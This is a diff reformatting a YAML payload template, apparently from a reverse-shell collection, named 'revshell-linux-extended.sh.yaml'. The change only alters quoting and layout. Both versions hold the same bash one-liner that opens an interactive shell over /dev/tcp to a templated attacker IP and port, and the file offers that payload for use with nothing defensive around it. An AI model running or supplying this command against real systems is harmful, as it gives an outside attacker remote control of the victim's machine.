@@ -1,10 +1,9 @@
+---
 metadata:
-  filename: revshell-linux-extended.sh.yaml
-  tags:
-  - shell
-  - linux
-  created: '2025-03-29'
-  author: Unknown
-content: 'bash -c "bash -i >& /dev/tcp/{{ attacker_ip }}/{{ shell_port }} 0>&1"
+  filename: "revshell-linux-extended.sh.yaml"
+  tags: ["shell", "linux"]
+  created: "2025-03-29"
+  author: "Unknown"
 
-  '
+content: |
+  bash -c "bash -i >& /dev/tcp/{{ attacker_ip }}/{{ shell_port }} 0>&1"
